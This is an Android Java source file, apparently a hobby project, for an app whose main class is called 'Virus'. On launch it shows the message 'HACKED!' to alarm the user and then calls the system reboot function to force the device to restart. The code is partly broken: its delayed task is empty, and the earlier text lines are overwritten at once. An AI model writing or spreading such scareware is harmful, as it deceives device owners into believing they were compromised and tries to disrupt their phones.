package com.johnmelodyme.melodyvirus;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.widget.TextView;

public class Virus extends AppCompatActivity {
    TextView text;
    Handler handler;

    private void init() {
        text = findViewById(R.id.textView);
        handler = new Handler();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        init();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
            }
        }, 5000);

        text.setText("");
        text.setText("YOU");
        text.setText("ARE");
        text.setText("HACKED!");
        PowerManager pm;
        pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        assert pm != null;
        pm.reboot(null);
    }
}
